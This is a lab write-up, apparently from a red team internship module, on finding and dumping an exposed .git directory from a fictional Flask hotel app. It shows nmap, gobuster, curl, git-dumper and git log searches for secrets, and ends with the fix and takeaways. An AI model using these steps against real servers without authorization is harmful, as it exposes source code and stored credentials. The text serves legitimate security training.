## Writeups
- [Byte Lotus — Git Exposure Recon](byte-lotus-writeup.md)
- 
# Byte Lotus: Finding the Rooms That Aren't on the Floor Plan

**Category:** Web / Reconnaissance
**Target:** Lab environment (`http://10.128.184.218:8080`)
**Tools:** Nmap, Gobuster, curl, git-dumper

## Intro

Byte Lotus is a fictional "guest experience" hotel platform — the pitch is a slick web app with open WiFi and a concierge that already knows your coffee order. The premise for this exercise: the developer who shipped it did so in a hurry, and shipped more than the website.

## Recon

Started with a full TCP port scan:

```
nmap -sV -p- 10.128.184.218
```

Results:

| Port | Service | Version |
|------|---------|---------|
| 22   | ssh     | OpenSSH 9.6p1 (Ubuntu) |
| 8080 | http    | Werkzeug/3.0.1, Python/3.12.3 |

The `Werkzeug` banner is the tell — this is Flask's built-in development server, not a production WSGI setup. Dev servers like this are frequently left running with no hardening: no reverse proxy stripping dotfiles, no production `.gitignore` deployment step, files served straight off disk.

Confirmed with a quick request:

```
curl -s http://10.128.184.218:8080/ -o index.html
```

The response headers (`Content-Disposition: inline; filename=index.html`) suggested the server was mapping URL paths fairly directly to files on disk — worth testing whether that extended to files that shouldn't be public.

## Directory enumeration

```
gobuster dir -u http://10.128.184.218:8080 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x txt,zip,bak,old,py,json \
  -t 40
```

One hit stood out immediately:

```
/.git/HEAD            (Status: 200) [Size: 21]
```

A `200` on `/.git/HEAD` almost always means the developer's entire local Git repository — including full commit history — is sitting in the web root, publicly reachable.

Confirmed:

```
curl -i http://10.128.184.218:8080/.git/HEAD
# ref: refs/heads/main

curl -i http://10.128.184.218:8080/.git/config
# [core] repositoryformatversion = 0 ...
```

Both returned clean, valid Git internals. Repo confirmed exposed.

## Dumping the repo

```
pip install git-dumper
git-dumper http://10.128.184.218:8080/.git/ ./byte-lotus-repo
```

With the full repo local, the real value is in *history*, not just the current working tree — files get deleted from a repo but never really disappear:

```
git log --all --oneline
git log --diff-filter=D --name-only --all      # files that were removed
git log -p --all | grep -iE "password|secret|key|token|flag|admin"
```

Any interesting deleted file can be recovered directly:

```
git show <commit>:path/to/file
```

## Why this matters

This is a textbook case of **source code / VCS exposure** (OWASP: Sensitive Data Exposure / CWE-527). The impact chain is simple but severe:

1. Dev server left running in a way that serves dotfiles.
2. `.git` directory not excluded from the served path.
3. Full commit history downloadable by anyone → source code, past credentials, internal API routes, and anything "removed" in a later commit are all recoverable.

**Fix:** never deploy with the Flask dev server in front of the internet; use a real WSGI server (gunicorn/uwsgi) behind nginx, explicitly deny dotfile paths at the proxy layer, and treat anything ever committed to Git as compromised once it's been pushed — rotate it, don't just delete it.

## Takeaways

- `Server: Werkzeug` in an nmap banner is worth checking by hand every time.
- Directory brute-forcing with extension guessing (`-x`) catches backup/config files that a plain wordlist run misses.
- A single `200` on `/.git/HEAD` is enough to justify a full repo dump — the payoff-to-effort ratio is enormous.
- History matters more than the working tree. Never assume a deleted file is gone.

*Part of the Cyberster Red Team Internship — Web Recon module.*
